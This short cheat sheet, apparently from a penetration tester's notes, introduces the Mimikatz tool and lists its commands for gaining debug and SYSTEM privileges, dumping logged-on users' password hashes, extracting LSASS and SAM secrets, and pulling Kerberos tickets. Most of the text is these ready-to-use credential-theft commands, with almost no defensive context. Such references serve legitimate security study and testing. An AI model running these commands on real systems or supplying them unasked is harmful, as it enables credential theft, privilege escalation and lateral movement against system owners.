**Mimikatz** is a tool that is commonly used by hackers and security professionals to *extract sensitive information*, such as passwords and credentials, from a system’s memory. It is typically used to gain unauthorized access to networks, systems, or applications or to perform other malicious activities, such as *privilege escalation* or *lateral movement* within a network.

# Commands

- To Check For *Admin Priviliges* :-
```mimikatz
privilege::debug
```
![[Pasted image 20230120170758.png]]

- Elevate to *System Privileges*:
```mimikatz
token::elevate
```

- To *Dump Passwords* :-
```sh
# Dump hashes of all users logged on the current system/server
sekurlsa::logonpasswords

# Dump passwords stored in LSASS
lsadump::lsa /patch
## OR
lsadump::sam

# Get TGS & TGT
sekurlsa::tickets
```
	
![[Pasted image 20230120171713.png]]

![[Pasted image 20230719170540.png]]